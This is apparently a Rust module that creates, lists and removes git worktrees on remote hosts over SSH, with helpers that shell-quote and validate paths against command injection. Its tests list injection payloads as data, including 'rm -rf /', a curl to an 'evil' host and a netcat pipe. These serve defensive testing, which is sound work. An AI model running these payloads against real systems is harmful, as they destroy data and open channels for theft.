use std::path::PathBuf;

use porpoise_core::error::{PorpoiseError, Result};

use crate::{
    auth::AuthMethod,
    reconnect::{AutoReconnectSession, ReconnectConfig},
};

/// Details about a remote git worktree created over SSH.
pub struct RemoteWorktree {
    /// Display name for the worktree.
    pub name: String,
    /// Remote host address.
    pub host: String,
    /// Path to the repository on the remote host.
    pub remote_path: PathBuf,
    /// Local path where the repo is mirrored (if cloned).
    pub local_path: Option<PathBuf>,
}

/// Manages remote worktrees over SSH connections.
///
/// Provides operations for creating, listing, and removing git worktrees
/// on remote hosts via SSH. Commands are executed through the auto-reconnecting
/// SSH session.
pub struct SshWorktreeManager {
    session: AutoReconnectSession,
}

impl SshWorktreeManager {
    /// Creates a new worktree manager for the given SSH host.
    pub async fn connect(
        host: &str,
        port: u16,
        username: &str,
        auth: AuthMethod,
        config: ReconnectConfig,
    ) -> Result<Self> {
        let session = AutoReconnectSession::connect(host, port, username, auth, config).await?;
        Ok(Self { session })
    }

    /// Creates a new git worktree on the remote host.
    ///
    /// Runs `git worktree add <path> <branch>` over SSH.
    pub async fn create_worktree(&self, repo_path: &str, branch: &str, worktree_path: &str) -> Result<RemoteWorktree> {
        validate_remote_path(repo_path)?;
        validate_remote_path(branch)?;
        validate_remote_path(worktree_path)?;
        let _output = self
            .session
            .exec(&format!(
                "git -C {} worktree add -B {} {}",
                shell_quote(repo_path),
                shell_quote(branch),
                shell_quote(worktree_path)
            ))
            .await?;

        Ok(RemoteWorktree {
            name: branch.to_string(),
            host: self.session.connected_str(),
            remote_path: PathBuf::from(worktree_path),
            local_path: None,
        })
    }

    /// Lists worktrees on the remote host.
    pub async fn list_worktrees(&self, repo_path: &str) -> Result<Vec<String>> {
        validate_remote_path(repo_path)?;
        let output = self
            .session
            .exec(&format!(
                "git -C {} worktree list --porcelain",
                shell_quote(repo_path)
            ))
            .await?;

        Ok(output
            .lines()
            .filter(|l| l.starts_with("worktree "))
            .map(|l| l.trim_start_matches("worktree ").to_string())
            .collect())
    }

    /// Removes a worktree on the remote host.
    pub async fn remove_worktree(&self, repo_path: &str, worktree_path: &str) -> Result<()> {
        validate_remote_path(repo_path)?;
        validate_remote_path(worktree_path)?;
        self.session
            .exec(&format!(
                "git -C {} worktree remove {}",
                shell_quote(repo_path),
                shell_quote(worktree_path)
            ))
            .await?;
        Ok(())
    }

    /// Runs an arbitrary command on the remote host in the repo directory.
    pub async fn exec(&self, command: &str) -> Result<String> {
        self.session.exec(command).await
    }
}


/// Validates a remote path / git ref before it is embedded in a shell command.
///
/// Rejects empty strings and embedded NUL or control characters that cannot be
/// represented safely. Combined with [`shell_quote`] this neutralizes remote
/// command injection (CVE-H1): even if a caller-supplied value contained shell
/// metacharacters it is single-quoted before reaching the remote shell.
fn validate_remote_path(path: &str) -> Result<()> {
    if path.is_empty() {
        return Err(PorpoiseError::Validation(
            "remote path must not be empty".to_string(),
        ));
    }
    if path.bytes().any(|b| b == 0 || b.is_ascii_control()) {
        return Err(PorpoiseError::Validation(format!(
            "remote path contains illegal control/NUL characters: {path:?}"
        )));
    }
    Ok(())
}

/// Quotes a string for safe interpolation into a POSIX shell command.
///
/// Wraps the value in single quotes and escapes any embedded single quote via
/// the standard `'\''` sequence. The result is always a single shell word that
/// is interpreted literally — no metacharacter (``;`` ``&`` ``|`` ``$`` etc.)
/// can break out of it.
fn shell_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_quote_passes_simple_path_through() {
        assert_eq!(shell_quote("/srv/repo"), "'/srv/repo'");
        assert_eq!(shell_quote("feature/x"), "'feature/x'");
    }

    #[test]
    fn shell_quote_neutralizes_injection_payloads() {
        // Every dangerous payload must be fully wrapped: no unquoted ';'/'&'/'$'
        // survives, so a following `&& git` / `; rm -rf` can never execute.
        for evil in [
            "x; rm -rf /",
            "x && curl http://evil",
            "x`whoami`",
            "x$(id)",
            "x | nc evil 1337",
            "'; DROP TABLE t; --",
        ] {
            let q = shell_quote(evil);
            assert!(q.starts_with('\'') && q.ends_with('\''), "unwrapped: {evil} -> {q}");
            // Single-quoting makes every char literal; the ONLY char that can
            // break containment is a bare `'`, which is neutralized via `'\''`.
            // The decisive invariant is round-trip: undo the wrapping + escape
            // and we must recover the input exactly -> it is one literal word.
            let inner = &q[1..q.len() - 1];
            let reconstructed: String = inner.replace("'\\''", "'");
            assert_eq!(reconstructed, evil, "round-trip broken (word not literal): {evil} -> {q}");
            if evil.contains('\'') {
                assert!(q.contains("'\\''"), "embedded quote not escaped: {evil} -> {q}");
            }
        }
    }

    #[test]
    fn shell_quote_preserves_legit_spaces() {
        // Paths with spaces must round-trip as a single literal shell word.
        assert_eq!(shell_quote("/a b/c"), "'/a b/c'");
    }

    #[test]
    fn validate_rejects_empty_and_control_chars() {
        assert!(validate_remote_path("").is_err());
        assert!(validate_remote_path("ok/path").is_ok());
        assert!(validate_remote_path("bad\npath").is_err());
        assert!(validate_remote_path("bad\0path").is_err());
        // A payload that would otherwise inject is *accepted* by validation
        // (no control chars) but is made safe by shell_quote — defense in depth.
        assert!(validate_remote_path("x; rm -rf /").is_ok());
    }
}
